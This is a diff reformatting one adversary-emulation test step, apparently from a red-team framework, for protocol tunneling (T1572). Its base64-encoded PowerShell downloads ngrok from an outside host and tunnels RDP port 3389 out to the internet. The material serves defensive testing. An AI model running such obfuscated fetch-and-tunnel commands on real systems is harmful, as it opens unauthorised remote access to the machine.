@@ -1,14 +1,16 @@
-- id: 74209d8d-72b9-5fd3-9229-453f42f98762
+- requirements: []
   name: Soumaia ART Tests - run ngrok
   description: Download and run ngrok. Create tunnel to chosen port. (requires elevation)
   tactic: command-and-control
-  technique:
-    attack_id: T1572
-    name: Protocol Tunneling
-  platforms:
-    windows:
-      psh:
-        command: "powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAbgBnAHIAbwBrACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA\nif ($LASTEXITCODE -ne 0) {\n    powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBQAGEAdABoACAAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXABuAGcAcgBvAGsAIAAtAEkAdABlAG0AVAB5AHAAZQAgAEQAaQByAGUAYwB0AG8AcgB5ACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAGgAdAB0AHAAcwA6AC8ALwBiAGkAbgAuAGUAcQB1AGkAbgBvAHgALgBpAG8ALwBjAC8AYgBOAHkAagAxAG0AUQBWAFkANABjAC8AbgBnAHIAbwBrAC0AdgAzAC0AcwB0AGEAYgBsAGUALQB3AGkAbgBkAG8AdwBzAC0AYQBtAGQANgA0AC4AegBpAHAAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAG4AZwByAG8AawBcAG4AZwByAG8AawAtAHYAMwAtAHMAdABhAGIAbABlAC0AdwBpAG4AZABvAHcAcwAtAGEAbQBkADYANAAuAHoAaQBwAAoARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXABuAGcAcgBvAGsAXABuAGcAcgBvAGsALQB2ADMALQBzAHQAYQBiAGwAZQAtAHcAaQBuAGQAbwB3AHMALQBhAG0AZAA2ADQALgB6AGkAcAAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuAFAAYQB0AGgAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAG4AZwByAG8AawAKAA==\n}\nC:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken N/A | Out-Null\nStart-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp 3389 } | Out-Null\nStart-Sleep -s 5 \nStop-Job -Name Job1 | Out-Null"
-        cleanup: |-
-          Remove-Item C:\Users\Public\ngrok -Recurse -ErrorAction Ignore
-          Remove-Item C:\%userprofile%\AppData\Local\ngrok -ErrorAction Ignore
+  technique_id: T1572
+  technique_name: Protocol Tunneling
+  executors:
+  - cleanup:
+    - Remove-Item C:\Users\Public\ngrok -Recurse -ErrorAction Ignore; Remove-Item C:\%userprofile%\AppData\Local\ngrok -ErrorAction Ignore
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAbgBnAHIAbwBrACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBQAGEAdABoACAAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXABuAGcAcgBvAGsAIAAtAEkAdABlAG0AVAB5AHAAZQAgAEQAaQByAGUAYwB0AG8AcgB5ACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAGgAdAB0AHAAcwA6AC8ALwBiAGkAbgAuAGUAcQB1AGkAbgBvAHgALgBpAG8ALwBjAC8AYgBOAHkAagAxAG0AUQBWAFkANABjAC8AbgBnAHIAbwBrAC0AdgAzAC0AcwB0AGEAYgBsAGUALQB3AGkAbgBkAG8AdwBzAC0AYQBtAGQANgA0AC4AegBpAHAAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAG4AZwByAG8AawBcAG4AZwByAG8AawAtAHYAMwAtAHMAdABhAGIAbABlAC0AdwBpAG4AZABvAHcAcwAtAGEAbQBkADYANAAuAHoAaQBwAAoARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXABuAGcAcgBvAGsAXABuAGcAcgBvAGsALQB2ADMALQBzAHQAYQBiAGwAZQAtAHcAaQBuAGQAbwB3AHMALQBhAG0AZAA2ADQALgB6AGkAcAAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuAFAAYQB0AGgAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAG4AZwByAG8AawAKAA== }; C:\Users\Public\ngrok\ngrok.exe config add-authtoken N/A | Out-Null; Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp 3389 } | Out-Null; Start-Sleep -s 5; Stop-Job -Name Job1 | Out-Null
+  id: 74209d8d-72b9-5fd3-9229-453f42f98762
